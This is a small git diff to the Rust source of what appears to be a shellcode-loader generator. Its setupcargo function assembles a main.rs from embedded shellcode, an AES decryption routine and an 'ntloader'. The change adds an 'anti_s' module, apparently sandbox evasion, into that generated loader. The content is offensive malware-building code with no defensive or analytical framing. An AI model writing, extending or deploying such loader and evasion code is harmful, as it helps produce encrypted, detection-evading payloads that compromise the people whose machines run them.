@@ -11,7 +11,7 @@ use winapi::um::cfgmgr32::fMD_CombinedWrite;
 use block_modes::block_padding::Pkcs7;
 use block_modes::{BlockMode, Cbc};
 use std::process::Command;
-use tools::{aesdecryption, main_, main_imports, maincargo, ntloader};
+use tools::{aesdecryption, main_, main_imports, maincargo, ntloader,anti_s};
 use xz2::write::XzEncoder;
 
 pub fn setupcargo(project_name: &str) {
@@ -43,7 +43,7 @@ pub fn setupcargo(project_name: &str) {
 
     let mut main_rs_path = format!("{}/src/main.rs", project_name);
 
-    let combined_code = main_imports() + &shellcode + &aesdecryption() + &ntloader() + &main_();
+    let combined_code = main_imports() + &shellcode + &aesdecryption() + &ntloader() + &anti_s() + &main_();
 
     let mut main_rs = File::create(main_rs_path).expect("Failed to open main.rs");
     main_rs
